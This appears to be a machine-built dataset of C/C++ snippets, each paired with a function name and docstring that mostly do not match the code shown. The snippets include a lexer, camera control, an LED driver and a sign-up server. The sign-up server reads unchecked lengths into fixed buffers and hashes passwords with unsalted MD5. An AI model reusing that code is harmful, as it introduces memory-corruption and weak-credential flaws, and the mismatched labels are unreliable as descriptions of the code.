{"content":"{'function_name': 'preProcess', 'docstring': '\/\/pair\u63d2\u5165\u6548\u7387\u9ad8\u4e8e\u76f4\u63a5 Symbols[\"*\"] = 1; \u8fd9\u6837', 'code': 'int main(int argc, const char * argv[]) {\\n    preProcess();\/\/\u9884\u5904\u7406\uff0c\u52a0\u8f7dsymbols,keywords\u7b49\\n    \\n    string inputString;\\n    string token;\\n    bool legalString = true;\\n    \\n    getline(cin,inputString);\\n\\n    \/\/inputString = handleSpace(inputString); \u53ef\u4ee5\u628a\u7a7a\u683c\u8fd0\u7528\u5230\u5206\u5272\u4e2d\uff0c\u771f\u7684\u7f16\u8bd1\u5668\u4e0d\u662f\u8fd9\u4e48\u7b80\u5355\u7684\\n    \/\/cout<<inputString<<endl;\u793a\u8303\u6027\u7f16\u8bd1\u8f93\u51fa\\n    \\n    for (int i = 0; i < inputString.length(); i ++)\\n    {\\n        if(isLegalSymbol(inputString[i]) == false)\\n        {\\n            cout<<\"\u51fa\u73b0\u975e\u6cd5\u5b57\u7b26, \u4e2d\u6b62\u7a0b\u5e8f!\"<<endl;\\n            legalString = false;\\n            break;\\n        }\\n    }\\n    \\n    if(legalString)\/\/\u5408\u6cd5\u5b57\u7b26\u4e32\u624d\u80fd\u8fdb\u884c\u8bcd\u6cd5\u5206\u6790\\n    {\\n    for(int i = 0;i < inputString.length();i ++)\\n    {\\n        if(inputString[i] == \\' \\')\\n        {\\n            token = \"\";\/\/clear\\n            continue;\\n        }\\n        \\n        \\n        if(isLetter(inputString[i]))\/\/\u6807\u8bc6\u522b\u7b26\uff0c\u770b\u770b\u662f\u4e0d\u662fkeywords\u6216\u8005ID\\n        {\\n            while ((isLetter(inputString[i]) || isDigit(inputString[i]) ) )\\n            {\\n                token += inputString[i];\\n                i++;\\n            }\\n            int keywordNumber = isKeyword(token);\\n            if(keywordNumber == -1)\/\/\u8fd4\u56de\uff0d1\u8868\u793a\u975e\u5173\u952e\u5b57\\n            {\\n                keywordNumber = 10;\\n                cout<<\"(\"<<keywordNumber<<\",\"<<token<<\")\";\\n            }\\n            else\\n            {\\n                cout<<\"(\"<<keywordNumber<<\",\"<<token<<\")\";\\n            }\\n            i--;\\n            token = \"\";\/\/clear\\n        }\\n        if(isDigit(inputString[i]))\/\/\u5224\u65ad\u662f\u4e0d\u662f\u6570\u5b57\\n        {\\n            while (isDigit(inputString[i]))\\n            {\\n                token += inputString[i];\\n                i++;\\n            }\\n            if(isLetter(inputString[i]))\\n            {\\n                cout<<\"\u672a\u8bc6\u522b\u51fa\u6765,\u4e2d\u6b62\"<<endl;\\n                token = \"\";\\n                break;\\n            }\\n            else\\n            {\\n                i--;\\n                cout<<\"(\"<<11<<\",\"<<token<<\")\";\\n                token = \"\";\/\/clear\\n            }\\n        }\\n        \/\/\u4f59\u4e0b\u5b57\u7b26\\n        if( isLegalSymbol(inputString[i]) && !isDigit(inputString[i]) && !isLetter(inputString[i]) && inputString[i] != \\' \\')\\n        {\\n            token += inputString[i];\\n            i++;\\n            if((inputString[i-1] == \\':\\' || inputString[i-1] == \\'<\\' || inputString[i-1] == \\'>\\') && (inputString[i] == \\'=\\' || inputString[i] == \\'>\\'))\/\/\u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u7b26\u5408\u8981\u6c42\uff0c\u52a0\u5165\\n            {\\n                token += inputString[i];\\n            }\\n            else\/\/\u5426\u5219i\u7684\u4e0b\u4e00\u4e2a\u5f97\u653e\u5230\u4e0b\u4e00\u8f6e\u5224\u5b9a,i--\u8fd8\u539f\\n            {\\n                    i--;\\n            }\\n            int otherwordsNumber = Symbols[token];\\n            cout<<\"(\"<<otherwordsNumber<<\",\"<<token<<\")\";\\n            token = \"\";\/\/clear\\n        }\\n    }\\n    }\\n    \\n    \\n    cout<<endl;\\n    \\n    \\n    return 0;\\n}'}","id":1104}
{"content":"{'function_name': 'RIVER_Start', 'docstring': '\/\/0;', 'code': 'int RIVER_CMD_SetTime(int chn, time_t t, int force)\\n{\\n\\tipc_unit ipcam;\\n\\tif(IPC_Get(chn, &ipcam))\\n\\t{\\n\\t\\treturn -1;\\n\\t}\\n\\t\\n\\tif(!force)\\n\\t{\\n\\t\\tif(!ipcam.enable || !RIVER_GetLinkStatus(chn))\\n\\t\\t{\\n\\t\\t\\t\/\/printf(\"RIVER_CMD_SetTime: chn%d vlost!!!\\\\n\",chn);\\n\\t\\t\\treturn -1;\\n\\t\\t}\\n\\t}\\n\\t\\n\\tERR_CODE errCode = ERR_FAILURE;\\n\\t\\n\\tif(!g_sdk_inited)\\n\\t{\\n\\t\\terrCode = NET_Startup(5000, LogonNotifyCallback, CheckUserPswCallback, UpdateFileCallback, ServerMsgCmdCallback, StreamWriteCheckCallback, (ChannelStreamCallback)PreviewStreamCallback);\\n\\t\\t\/\/printf(\"--->|\\\\tNET_Startup: %s\\\\n\",errCode?\"Failed!\":\"Successful!\");\\n\\t\\tif(errCode)\\n\\t\\t{\\n\\t\\t\\tprintf(\"NET_Startup failed\\\\n\");\\n\\t\\t\\treturn -1;\\n\\t\\t}\\n\\t\\tg_sdk_inited = 1;\\n\\t}\\n\\t\\n\\tif(t == 0)\\n\\t{\\n\\t\\tt = time(NULL);\/\/ + 1;\/\/???\\n\\t}\\n\\t\\n\\tint nTimeZone = IPC_GetTimeZone();\\n\\tt += GetTZOffset(nTimeZone);\\n\\t\\n\\tstruct tm now;\\n\\tlocaltime_r(&t,&now);\\n\\t\\n\\t\/*char date[64];\\n\\tsprintf(date,\"%04d.%02d.%02d.%02d.%02d.%02d\",\\n\\t\\tnow.tm_year+1900,\\n\\t\\tnow.tm_mon+1,\\n\\t\\tnow.tm_mday,\\n\\t\\tnow.tm_hour,\\n\\t\\tnow.tm_min,\\n\\t\\tnow.tm_sec);*\/\\n\\t\\n\\tDVS_DATE nDVSTime;\\n\\tmemset(&nDVSTime, 0, sizeof(nDVSTime));\\n\\tnDVSTime.year = now.tm_year - 100;\\n\\tnDVSTime.month\\t= now.tm_mon + 1;\\n\\tnDVSTime.day   = now.tm_mday;\\n\\tnDVSTime.week  = now.tm_wday;\\n\\tnDVSTime.hour  = now.tm_hour;\\n\\tnDVSTime.minute = now.tm_min;\\n\\tnDVSTime.second = now.tm_sec;\\n\\t\\n\\tif(g_riverc_info[chn].hLogonServer == INVALID_HANDLE)\\n\\t{\\n\\t\\tchar devip[64];\\n\\t\\tmemset(devip, 0, sizeof(devip));\\n\\t\\t\\n\\t\\tstruct in_addr serv;\\n\\t\\tserv.s_addr = ipcam.dwIp;\\n\\t\\tsprintf(devip, \"%s\", inet_ntoa(serv));\\n\\t\\t\\n\\t\\terrCode = NET_LogonServer(devip, ipcam.wPort, (CHAR *)\"admin\", ipcam.user, ipcam.pwd, 0, &g_riverc_info[chn].hLogonServer);\\n\\t\\tif(errCode)\\n\\t\\t{\\n\\t\\t\\tprintf(\"chn%d NET_LogonServer failed\\\\n\",chn);\\n\\t\\t\\tg_riverc_info[chn].hLogonServer = INVALID_HANDLE;\\n\\t\\t\\treturn -1;\\n\\t\\t}\\n\\t}\\n\\t\\n\\terrCode = NET_SetServerConfig(g_riverc_info[chn].hLogonServer, CMD_SET_TIME, (CHAR *)&nDVSTime, sizeof(nDVSTime), 0);\\n\\tif(errCode)\\n\\t{\\n\\t\\tprintf(\"chn%d NET_SetServerConfig CMD_SET_TIME failed:%d\\\\n\",chn,errCode);\\n\\t\\treturn -1;\\n\\t}\\n\\t\\n\\tprintf(\"chn%d NET_SetServerConfig CMD_SET_TIME success\\\\n\",chn);\\n\\t\\n\\treturn 0;\\n}'}","id":1107}
{"content":"{'function_name': 'getDate', 'docstring': '\/\/ prompt for input until validate() returns true', 'code': 'bool validate(int *month, int *day, int *year)\\n{   \\n    \/\/ 1 - 12 denotes valid monthss\\n    if(*month >= January && *month <= December)\\n    {\\n        switch(*month)\\n        {\\n            \/\/ months with only 30 days\\n            case April:\\n            case June:\\n            case September:\\n            case November:\\n                if(*day > 0 && *day < CJ)\\n                    return true;\\n            break;\\n            \\n            \/\/ months with 31 days\\n            case January:\\n            case March:\\n            case May:\\n            case July:\\n            case August:\\n            case October:\\n            case December:\\n                if(*day > 0 && *day <= CJ)\\n                    return true;\\n            break;\\n            \\n            case February:\\n                \/\/ february has 29 days in a leap year\\n                if (*year % 4 == 0 && *day > 0 && *day <= 29)\\n                   return true;\\n            \\n                \/\/ and 28 otherwise\\n                else if (*day > 0 && *day < 29)\\n                    return true;\\n             break;\\n        }\\n        \\n    }\\n    \\n    \/\/ date entered is invalid\\n    cout << \"INVALID DATE!\\\\n\"\\n         << \"(MONTH DAY YEAR)\" << endl;\\n    return false;\\n}'}","id":1117}
{"content":"{'function_name': 'main', 'docstring': '\/\/Max(10, 20); \/\/ 10 , 20 \u662f\u5e38\u91cf\uff0c\u5f15\u7528\u52a0const', 'code': 'int main()\\n{\\n\\tint a = 10;\\n\\tint* pa = &a;\\n\\n\\tconst int b1 = 10;\\n\\tint const b2 = 20;\\n\\n\\tTest(pa); \/\/ int*\\n\\n\\treturn 0;\\n}'}","id":1118}
{"content":"{'function_name': 'DispatchPnp', 'docstring': '\/\/ Simply forward any other type of PnP request\\r', 'code': 'ULONG GetDeviceTypeToUse(PDEVICE_OBJECT pdo)\\r\\n\\t{\\t\\t\\t\\t\\t\\t\\t\/\/ GetDeviceTypeToUse\\r\\n\\tPDEVICE_OBJECT ldo = IoGetAttachedDeviceReference(pdo);\\r\\n\\tif (!ldo)\\r\\n\\t\\treturn FILE_DEVICE_UNKNOWN;\\r\\n\\tULONG devtype = ldo->DeviceType;\\r\\n\\tObDereferenceObject(ldo);\\r\\n\\treturn devtype;\\r\\n\\t}'}","id":1123}
{"content":"{'function_name': 'MimeOleCreateWebDocument', 'docstring': '\/\/ Done\\r', 'code': 'HRESULT MimeOleComputeContentBase(IMimeMessage *pMessage, HBODY hRelated,\\r\\n    LPSTR *ppszBase, BOOL *pfMultipartBase)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    HBODY       hBase=NULL;\\r\\n\\r\\n    \/\/ Init\\r\\n    if (pfMultipartBase)\\r\\n        *pfMultipartBase = FALSE;\\r\\n\\r\\n    \/\/ If no hRelated was passed in, lets try to find one\\r\\n    if (NULL == hRelated)\\r\\n    {\\r\\n        \/\/ Find the related section\\r\\n        if (FAILED(MimeOleGetRelatedSection(pMessage, FALSE, &hRelated, NULL)))\\r\\n        {\\r\\n            \/\/ Get the root body\\r\\n            pMessage->GetBody(IBL_ROOT, NULL, &hRelated);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ Get the text\/html body\\r\\n    if (FAILED(pMessage->GetTextBody(TXT_HTML, IET_BINARY, NULL, &hBase)))\\r\\n        hBase = hRelated;\\r\\n\\r\\n    \/\/ No Base\\r\\n    if (NULL == hBase)\\r\\n    {\\r\\n        hr = E_FAIL;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Call utility function\\r\\n    *ppszBase = MimeOleContentBaseFromBody(pMessage, hBase);\\r\\n\\r\\n    \/\/ If that failed and we used the text body\\r\\n    if (NULL == *ppszBase && hRelated && hBase != hRelated)\\r\\n        *ppszBase = MimeOleContentBaseFromBody(pMessage, hRelated);\\r\\n\\r\\n    \/\/ Did this come from the multipart related\\r\\n    if (NULL != *ppszBase && hBase == hRelated && pfMultipartBase)\\r\\n        *pfMultipartBase = TRUE;\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":1124}
{"content":"{'function_name': 'hook_sv_spawnserver', 'docstring': '\/* Do stuff after sv has been spawned here *\/', 'code': 'void custom_SV_MasterHeartbeat(const char *game)\\n{\\n\\treturn;\\t\/\/ disabled masterserver listing\\n}'}","id":1130}
{"content":"{'function_name': 'make_cost_layer', 'docstring': '\/\/l.backward = backward_cost_layer;', 'code': 'maxpool_layer make_maxpool_layer(int batch, int h, int w, int c, int size, int stride, int padding, int index)\\n{\\n    layer l;\\n    memset((void *)&l, 0, sizeof(layer));\\n    l.type = MAXPOOL;\\n    l.batch = batch;\\n    l.h = h;\\n    l.w = w;\\n    l.c = c;\\n    l.pad = padding;\\n    l.out_w = (w + padding - size)\/stride + 1;\\n    l.out_h = (h + padding - size)\/stride + 1;\\n    l.out_c = c;\\n    l.outputs = l.out_h * l.out_w * l.out_c;\\n    l.inputs = h*w*c;\\n    l.size = size;\\n    l.stride = stride;\\n    int output_size = l.out_h * l.out_w * l.out_c * batch;\\n    l.indexes = (int *)calloc(output_size, sizeof(int));\\n    l.output =  (float *)calloc(output_size, sizeof(float));\\n    l.delta =   (float *)calloc(output_size, sizeof(float));\\n    \/\/l.forward = forward_maxpool_layer;\\n    \/\/l.backward = backward_maxpool_layer;\\n    l.forward = NULL;\\n    l.backward = NULL;    \\n\\n    if(index >= global_start_index)\\n    {\\n        fprintf(stderr, \"max_TA       %d x %d \/ %d  %4d x%4d x%4d   ->  %4d x%4d x%4d\\\\n\", size, size, stride, w, h, c, l.out_w, l.out_h, l.out_c);\\n    }\\n    return l;\\n}'}","id":1131}
{"content":"{'function_name': 'led_update', 'docstring': '\/\/shutdown_effect', 'code': 'float ledcontrol_update(int width_temp,int width_update_speed_temp,int overlay_temp, int  total_offset ) {\\n\\n\\t\/\/int start_time = micros();\\n\\n\\tif (total_offset_previous > 200 && total_offset < 200 && led_width_actual == 20){\\n\\t\\t\/\/printf(\"RESET!\\\\n\");\\n\\t\\tled_index = 0;\\n\\t}\\n\\t\\n\\ttotal_offset_previous = (total_offset_previous + 4) % 400;  \/\/expected approximate change per cycle\\n\\t\\n\\tif (abs(total_offset - total_offset_previous) > 8){ \/\/this gives it a bit more leeway  50 FPS, 2 seconds per offset, offset cycle of 400. 400\/100 = 4\\n\\t\\t\/\/find shortest route \\n\\t\\tif((( total_offset - total_offset_previous + 400) % 400) < 200){  \/\/ add to total_offset_previous to reach total_offset\\n\\t\\t\\ttotal_offset_previous = ((total_offset_previous + 8)  % 400 ) ;\\n\\t\\t\\t\/\/printf(\"this: %d previous %d adding to catchup!\\\\n\", total_offset, total_offset_previous);\\n\\t\\t}else {\/\/ subtract from total_offset_previous to reach total_offset\\n\\t\\t\\ttotal_offset_previous = (total_offset_previous - 8 + 400) % 400;\\n\\t\\t\\t\/\/printf(\"this: %d previous %d subbing to catchup!\\\\n\", total_offset, total_offset_previous);\\n\\t\\t}\\t\\t   \\n\\t\\ttotal_offset = total_offset_previous; \/\/ use old value\\n\\t}\\n\\t\/\/at 50 FPS, and 2 second effect time, and 20 LEDs, every 2 seconds we do 3 rotations\\n\\t\/\/if we are at full width, reset the index to line it up\\n\\n\\ttotal_offset_previous = total_offset;\\n\\t\\n\\tint time_this_cycle = millis();\\n\\t\\n\\tif (overlay_temp == 0){\\n\\t\\toverlay_primer = true;\\n\\t\\toverlay_enabled=false;\\n\\t\\toverlay = 0x00;\\n\\t}else{\\n\\t\\tif( overlay_primer == true && overlay_enabled== false){\\n\\t\\t\\toverlay = 0xFF;\\n\\t\\t\\toverlay_enabled= true;\\n\\t\\t\\toverlay_primer = false;\\n\\t\\t\\toverlay_timer = time_this_cycle;\\n\\t\\t}\\n\\t}\\n\\t\\n\\tif (overlay_primer == true){\\n\\t\\t\\n\\t\\tif ((width_temp <= 20) && (width_temp >= 0)){\\n\\t\\t\\tled_width_requested = width_temp;\\n\\t\\t}\\n\\t\\t\\n\\t\\tif (width_update_speed_temp >=0){\\n\\t\\t\\twidth_update_speed = width_update_speed_temp;\\n\\t\\t}\\n\\t}\\n\\n\\t\/\/on a color change, or coming back from zero width, go full bright on fill complete\\n\\tif( (color1_previous.r != color1.r || color1_previous.g != color1.g || color1_previous.b != color1.b) || ((led_width_requested !=0 && led_width_actual == 0 ) && overlay_enabled == false)){\\n\\t\\t\/\/adjust time offset, aiming to hit max brightness as color fill completes\\n\\t\\t\/\/offset to half of resolution for 50 FPS\\n\\t\\ttimeoffset = 300 - total_offset;\\n\\t\\tcooldown_time = time_this_cycle;\\n\\t\\tcolor_update_index = 0;\\n\\t\\tcolor1_previous = color1;\\n\\t}\\n\\t\\n\\t\/\/tweak breathing rate to attempt to keep in sync across network\\n\\t\/\/only tweaks by 1 each cycle to be unnoticeable\\n\\t\/\/only tweak when overlay not enabled\\n\\n\\tif (time_this_cycle - cooldown_time > 1000){ \\n\\t\\tfor ( int i = 0; i < EFFECT_LENGTH; i++ ){\\n\\t\\t\\tif(timearray[i] < 0){  \/\/ add to total_offset_previous to reach total_offset\\n\\t\\t\\t\\ttimearray[i] = timearray[i] + 1;\\n\\t\\t\\t}else if(timearray[i] > 0) {\/\/ subtract from total_offset_previous to reach total_offset\\n\\t\\t\\t\\ttimearray[i] = timearray[i] - 1;\\n\\t\\t\\t}\\t\\n\\t\\t}\\n\\t\\t\\n\\t\\tif(timeoffset < 0){  \/\/ add to total_offset_previous to reach total_offset\\n\\t\\t\\ttimeoffset = timeoffset + 1;\\n\\t\\t\\t\/\/printf(\"Subbing to timearray! %d \\\\n\",timeoffset);\\n\\t\\t}else if(timeoffset > 0){\/\/ subtract from total_offset_previous to reach total_offset\\n\\t\\t\\ttimeoffset = timeoffset - 1;\\n\\t\\t\\t\/\/printf(\"Adding to timearray! %d \\\\n\",timeoffset);\\n\\t\\t}\\t\\n\\n\\t}\\n\\n\\tif (overlay_enabled == true){\\n\\t\\t\\n\\t\\tticks_since_overlay_enable = time_this_cycle - overlay_timer;\\n\\t\\t\\n\\t\\t\/\/printf(\"curtime %d\\\\n\", ticks_since_overlay_enable);\\n\\t\\t\\n\\t\\tif (ticks_since_overlay_enable > 127){  \/\/only ramp to half brightness to save strip\\n\\t\\t\\t\\n\\t\\t\\t\/\/overlay is now done, disable overlay\\n\\t\\t\\t\/\/blank the buffer, and set all variables to 0\\n\\t\\t\\toverlay_enabled = false;\\n\\t\\t\\tled_width_requested = 0;\\n\\t\\t\\tled_width_actual = 0 ;\\n\\t\\t\\tcolor_update_index = 20;\\n\\t\\t\\tcolor1 = CRGB(0,0,0);\\n\\t\\t\\tcolor1_previous = color1;\\n\\t\\t\\tfor ( int i = 0; i < EFFECT_LENGTH; i++ ){\\n\\t\\t\\t\\tmain_buffer_step1[i] = CRGB(0,0,0);\\n\\t\\t\\t\\ttimearray[i] = timeoffset;\\n\\t\\t\\t}\\n\\t\\t\\toverlay = 0x00;\\n\\t\\t\\t\\n\\t\\t}else{\\t\\n\\t\\t\\t\/\/during the overlay ramp up linearly, gives white output\\n\\t\\t\\toverlay = ticks_since_overlay_enable;\\n\\t\\t}\\n\\t}\\n\\t\\n\\t\/\/Update the color1 and time of lit LEDs\\n\\tif (color_update_index < led_width_actual){\\n\\t\\ttimearray[color_update_index] = timeoffset;\\n\\t\\tmain_buffer_step1[color_update_index] = color1;\\n\\t\\tcolor_update_index = color_update_index + 1;\\n\\t}\\n\\t\\n\\t\/\/width stuff\\n\\tif (time_this_cycle - width_update_speed_last_update > width_update_speed){\\n\\t\\t\/\/Narrow the lit section by blanking the index LED and incrementing the index.\\n\\t\\t\/\/Don\\'t change time data for color2 LEDs\\n\\t\\tif (led_width_requested < led_width_actual && led_width_requested >= 0){\\n\\t\\t\\t\/\/printf(\"smaller\\\\n\" );\\n\\t\\t\\tled_width_actual--;\\n\\t\\t\\tmain_buffer_step1[led_width_actual] = color2;\\n\\t\\t}\\n\\t\\t\/\/Widen the lit section by copying the index LED color1 and time data and decrementing the index.\\n\\t\\telse if( led_width_requested > led_width_actual  && led_width_requested <= EFFECT_LENGTH){\\n\\t\\t\\t\/\/printf(\"bigger\\\\n\" );\\n\\t\\t\\tif (led_width_actual == 0  ){\\n\\t\\t\\t\\t\/\/starting an empty array\\n\\t\\t\\t\\tmain_buffer_step1[0] = color1;\\n\\t\\t\\t\\ttimearray[0] = timeoffset;\\n\\t\\t\\t}else{\\n\\t\\t\\t\\tmain_buffer_step1[led_width_actual] = main_buffer_step1[led_width_actual-1];\\n\\t\\t\\t\\ttimearray[led_width_actual] = timearray[led_width_actual - 1];\\n\\t\\t\\t}\\n\\t\\t\\tled_width_actual++;\\n\\t\\t\\t\\n\\t\\t\\t\/\/supress color update code\\n\\t\\t\\tcolor_update_index++;\\n\\t\\t}\\n\\t\\twidth_update_speed_last_update = time_this_cycle;\\n\\t}\\n\\t\\n\\t\/\/printf(\"curtime %d\\\\n\", ((total_offset + timearray[0]) % EFFECT_RESOLUTION));\\n\\t\\n\\tfor ( int i = 0; i < EFFECT_LENGTH; i++ ) {\\n\\t\\tint curtime = 0;\\n\\t\\t\/\/dont apply brightness correction to first LED\\n\\t\\tif (i != led_width_actual-1){\\n\\t\\t\\tcurtime = (total_offset + timearray[i] + EFFECT_RESOLUTION) % EFFECT_RESOLUTION;\\n\\t\\t}\\n\\t\\tint current_location = (i + led_index) % EFFECT_LENGTH;\\n\\t\\t\\n\\t\\tmain_buffer_step2[current_location].r = brightnesslookup[main_buffer_step1[i].r][curtime] | overlay;\\n\\t\\tmain_buffer_step2[current_location].g = brightnesslookup[main_buffer_step1[i].g][curtime] | overlay;\\n\\t\\tmain_buffer_step2[current_location].b = brightnesslookup[main_buffer_step1[i].b][curtime] | overlay;\\n\\t}\\n\\t\\n\\t\\n\\t\/\/Shift array one LED forward and update index\\n\\tled_index = (led_index + 1) % EFFECT_LENGTH;\\n\\t\\n\\t\/\/32 zeros is start of data frame, 32 is end of frame\\n\\tuint8_t output_buffer[4 + LED_STRIP_LENGTH*4 + 4];\\n\\tint i = 0; \/\/physical led position\\n\\t\\n\\t\/\/start of data\\n\\tfor (int j = 0; j < 4; j++) output_buffer[i++] = 0x00;\\n\\t\\n\\t\/\/led ring output\\n\\tfor (int j = 0; j < EFFECT_LENGTH; j++){\\n\\t\\toutput_buffer[i++] = 0xFF;\\n\\t\\toutput_buffer[i++] = main_buffer_step2[j].b;\\n\\t\\toutput_buffer[i++] = main_buffer_step2[j].g;\\n\\t\\toutput_buffer[i++] = main_buffer_step2[j].r;\\n\\t}\\n\\t\\n\\t\/\/end of data\\n\\tfor (int j = 0; j < 4; j++) output_buffer[i++] = 0x00;\\n\\t\\t\\n\\tbang_buffer(output_buffer, sizeof(output_buffer)) ;\\n\\n\\t\/\/printf(\"Benchmark Microseconds! %d \\\\n\",micros()- start_time);\\n\\t\\n\\t\/\/return a number representing the current breathing of the array for other LEDs to use\\n\\treturn effect_array[(total_offset + timeoffset) % EFFECT_RESOLUTION];\\n}'}","id":1132}
{"content":"{'function_name': 'ComputeSubsetTable', 'docstring': '\/\/', 'code': 'static void CompressBlockFastOpaque(Cell& input) noexcept\\n{\\n\\t\/\/ DetectGlitches\\n\\tif (*(const short*)&input.Area1.MinMax_U16 <= (255 - 16))\\n\\t\\treturn;\\n\\n\\tinput.OpaqueAlphaError = ComputeOpaqueAlphaError(input.Area1);\\n\\n\\tif (input.Error.Total > input.OpaqueAlphaError)\\n\\t{\\n\\t\\tMode1::CompressBlockFast(input);\\n\\n\\t\\tif (input.Error.Total > input.OpaqueAlphaError)\\n\\t\\t{\\n\\t\\t\\tMode3::CompressBlockFast(input);\\n\\n\\t\\t\\tif (input.Error.Total > input.OpaqueAlphaError)\\n\\t\\t\\t{\\n\\t\\t\\t\\tMode2::CompressBlockFast(input);\\n\\n\\t\\t\\t\\tif (input.Error.Total > input.OpaqueAlphaError)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tMode0::CompressBlockFast(input);\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n}'}","id":1133}
{"content":"{'function_name': 'main', 'docstring': '\/\/ Loop', 'code': 'bool detectLum (Mat rgb_frame)\\n{\\n    Mat gray_frame(Size(640,480),CV_8UC3);\\n\\n    cvtColor(rgb_frame, gray_frame, CV_BGR2GRAY);\\n    cv::Scalar avgPixelIntensity = cv::mean( gray_frame );\\n\\n    \/\/printf(\"Lum level : %f\\\\n\", avgPixelIntensity.val[0]);\\n\\n    if( avgPixelIntensity.val[0] < darkThreshold )\\n        return false;\\n    else\\n        return true;\\n}'}","id":1135}
{"content":"{'function_name': 'LoginClient', 'docstring': '\/\/executam interogarea si trimitem la server confirmarea', 'code': 'int RegisterClient (struct thData tdL)\\n{\\n\\n    int credentialsLen;\\n    char *credentials = (char*) malloc (62);\\n\\n    fflush (stdout); \/\/golim buffer-ul succesiv\\n    if (read (tdL.cl, &credentialsLen, 4) <= 0)\\n    {\\n        printf(\"[Thread %d]\\\\n\",tdL.idThread);\\n        perror (\"Eroare la read()-ul lungimii string-ului de credentials de la client.\\\\n\");\\n    }\\n    \/\/ printf(\"%d\\\\n\",credentialsLen);\\n\\n    fflush (stdout);\\n    if (read(tdL.cl,credentials,credentialsLen) <=0)\\n    {\\n        printf(\"[Thread %d]\\\\n\",tdL.idThread);\\n        perror (\"Eroare la read()-ul stringului de credentials de la client.\\\\n\");\\n    }\\n    \/\/printf(\"%s\\\\n\",credentials);\\n\\n    char* password = (char*) malloc (30);\\n    char *pch;\\n\\n    bzero(username, 30);\\n    bzero(password, 30);\\n\\n    pch = strtok(credentials, \"$\");\\n    strcpy(username, pch);\\n    pch = strtok(NULL, \"$\");\\n    strcpy(password, pch);\\n\\n    \/\/criptam parola cu functia MD5\\n    std::string encryptedPassword;\\n    encryptedPassword=md5(password);\\n\\n    \/\/std::cout<<username<<\" \";\\n\\n    int confirmation=0;\\n    QSqlQuery query;\\n\\n    printf(\"Cautam in LearNet.db datele de sign up si trimitem clientului confirmarea daca username-ule ste deja existent in baza de date.\\\\n\");\\n\\n    char * enc_pass = new char[encryptedPassword.length() + 1];\\n    std::copy(encryptedPassword.begin(), encryptedPassword.end(), enc_pass);\\n    enc_pass[encryptedPassword.size()] = \\'\\\\0\\';\\n\\n    query.prepare(\"SELECT * FROM users WHERE username=?\");\\n    query.bindValue(0, username);\\n\\n    \/\/executam interogarea si trimitem la server confirmarea\\n    query.exec();\\n    if (query.first()) \/\/arata prima inregistrare din tabela care corespunde selectului\\n    {\\n        confirmation=0;\/\/username-ul este deja existent in baza de date\\n\\n        printf(\"Username-ul %s este deja existent in baza de date.\\\\n\", username);\\n\\n        if (write (tdL.cl, &confirmation, 4) <=0)\\n        {\\n            printf(\"[Thread %d] \",tdL.idThread);\\n            perror (\"[Thread]Eroare la write()-ul confirmarii de SignUp catre client.\\\\n\");\\n        }\\n    }\\n    else\\n    {\\n        confirmation=1;\\n\\n        query.prepare(\"INSERT INTO users VALUES (NULL, ?, ?)\");\\n        query.bindValue(0,username);\\n        query.bindValue(1,enc_pass);\\n        query.exec();\\n\\n        printf(\"Am inserat in baza de date username-ul %s, si parola criptata %s.\\\\n\", username, enc_pass);\\n\\n        if (write (tdL.cl, &confirmation, 4) <=0)\\n        {\\n            printf(\"[Thread %d] \",tdL.idThread);\\n            perror (\"[Thread]Eroare la write()-ul confirmarii de SignUp catre client.\\\\n\");\\n        }\\n    }\\n    return confirmation;\\n}'}","id":1147}
{"content":"{'function_name': 'SDLSoundInit', 'docstring': '\/* Set initial playback volume *\/', 'code': 'static int SDLSoundPlay()\\r\\n{\\r\\n    \/\/\\tdprintf(_T(\"SDLSoundPlay\\\\n\"));\\r\\n    \\r\\n    UInt32 err;\\r\\n    UInt32 i;\\r\\n    \\r\\n    AudioQueueStop( mAudioQueue, TRUE );\\r\\n    \/*\\r\\n     * Enqueue all the allocated buffers before starting the playback.\\r\\n     * The audio callback will be called as soon as one buffer becomes\\r\\n     * available for filling.\\r\\n     *\/\\r\\n    \\r\\n    buffer_ana_gen_ofs=buffer_ana_play_ofs=0;\\r\\n    for (i=0; i<nAudSegCount; i++) {\\r\\n        memset(buffer_ana[i],0,nAudLoopLen);\\r\\n        memset(mBuffers[i]->mAudioData,0,nAudLoopLen);\\r\\n        mBuffers[i]->mAudioDataByteSize = nAudLoopLen;\\r\\n        AudioQueueEnqueueBuffer( mAudioQueue, mBuffers[i], 0, NULL);\\r\\n        \/\/\\t\\t[self iPhoneDrv_FillAudioBuffer:mBuffers[i]];\\r\\n        \\r\\n    }\\r\\n    bAudPlaying=1;\\r\\n    \/* Start the Audio Queue! *\/\\r\\n    \/\/AudioQueuePrime( mAudioQueue, 0,NULL );\\r\\n    err = AudioQueueStart( mAudioQueue, NULL );\\r\\n    \\r\\n\\treturn 0;\\r\\n}'}","id":1151}
{"content":"{'function_name': 'fre', 'docstring': '\/\/freopen(\"out.txt\", \"w\", stdout);\\r', 'code': 'int main() {\\r\\n    \/\/fre();\\r\\n    while (scanf(\"%d\", &n)) {\\r\\n        if (!n) {\\r\\n            break;\\r\\n        }\\r\\n        scanf(\"%d%d\", &p, &q);\\r\\n        for (int i = 1; i <= n; ++i) {\\r\\n            scanf(\"%lf%lf\", &co[i].x, &co[i].y);\\r\\n        }\\r\\n        if (p > q) {\\r\\n            int temp = q;\\r\\n            q = p;\\r\\n            p = temp;\\r\\n        }\\r\\n        for (int i = 0; i < maxn; ++i) {\\r\\n            for (int j = 0; j < maxn; ++j) {\\r\\n                maze[i][j] = INF;\\r\\n            }\\r\\n        }\\r\\n        for (int i = 1; i <= n; ++i) {\\r\\n            for (int j = i + 1; j <= n; ++j) {\\r\\n                maze[i][j] = maze[j][i] = sqrt((co[i].x - co[j].x) * (co[i].x - co[j].x) + (co[i].y - co[j].y) * (co[i].y - co[j].y));\\r\\n            }\\r\\n        }\\r\\n        maze[p][q] = maze[q][p] = 0;\\r\\n        Prim();\\r\\n        NADis = sqrt((co[p].x - co[q].x) * (co[p].x - co[q].x) + (co[p].y - co[q].y) * (co[p].y - co[q].y));\\r\\n        printf(\"%.2lf\\\\n\", ans + NADis);\\r\\n    }\\r\\n    return 0;\\r\\n}'}","id":1152}
